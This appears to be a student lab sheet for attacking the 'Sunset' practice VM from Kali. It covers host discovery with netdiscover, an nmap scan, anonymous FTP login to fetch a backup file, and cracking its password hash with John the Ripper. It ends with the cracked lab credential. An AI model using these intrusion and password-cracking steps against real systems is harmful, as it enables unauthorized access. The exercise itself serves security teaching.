# PROGRAM – 03

## Experiment 3: Exploiting a Known Vulnerability

## 1. Network Discovery

- Start Sunset, and go to the network and keep to the bridge adapter.
- Now, start Kali machine.

Run:

```bash
netdiscover
```

- Identify the IP of the target machine (labelled as PCS System under hostname).

## 2. Port and Service Scan

Run:

```bash
nmap -A -p <target-IP>
```

- Confirm if:
  - FTP (Port 21) is open.
  - SSH (Port 22) is open.

## 3. FTP Exploitation (Anonymous Login)

Connect to FTP:

```bash
ftp <target-IP>
```

Login as:

```text
Username: anonymous
Password: (press Enter)
```

### List Files

```bash
ls
```

### Download File

```bash
get backup
```

### Exit FTP Session

```bash
exit
```

### Read the Backup File

```bash
cat backup
```

### Open Nano File and Paste the Sunset Encryption

```bash
nano 1.txt
```

## 4. Cracking Credentials with John the Ripper

After saving password hash into a text file (e.g., `1.txt`), run:

```bash
john 1.txt
```

**Note:** If you get output similar to:

```text
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/12B 55E2 2x])
No password hashes left to crack (see FAQ)
```

then it means the file has been decrypted many times and the password is already stored in the database.

Then type:

```bash
john --show 1.txt
```

### Retrieve Cracked Password

```text
Username: sunset
Password : cheer14
```
